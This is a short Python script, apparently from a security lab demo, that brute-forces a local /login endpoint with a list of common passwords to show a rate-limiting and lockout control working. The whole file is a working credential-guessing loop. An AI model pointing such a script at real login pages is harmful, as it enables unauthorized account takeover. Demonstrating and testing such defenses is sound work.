"""
Scenario 2: DB/credential steal attempt (online brute-force).
Simulates an attacker running a password list against the live /login
endpoint. Demonstrates the rate-limiting control kicking in.

Usage:
    python attacker_bruteforce.py <username>
"""
import sys
import requests

TARGET = "http://127.0.0.1:5000/login"

PASSWORD_LIST = [
    "123456", "password", "qwerty", "letmein",
    "admin123", "welcome1", "iloveyou", "111111",
]

username = sys.argv[1] if len(sys.argv) > 1 else "victim"

session = requests.Session()
print(f"Target: {TARGET}\nUsername: {username}\n")

for i, pwd in enumerate(PASSWORD_LIST, 1):
    resp = session.post(
        TARGET, data={"username": username, "password": pwd}, allow_redirects=True
    )
    print(f"[{i}] Trying password: {pwd!r}")
    if "locked" in resp.text.lower():
        print("    -> Account locked. Rate limiting stopped further attempts.")
        break
    elif "/otp" in resp.url:
        print(f"    -> SUCCESS! Password found: {pwd}")
        break
    else:
        print("    -> Failed.")

print("\nBrute-force attempt finished.")
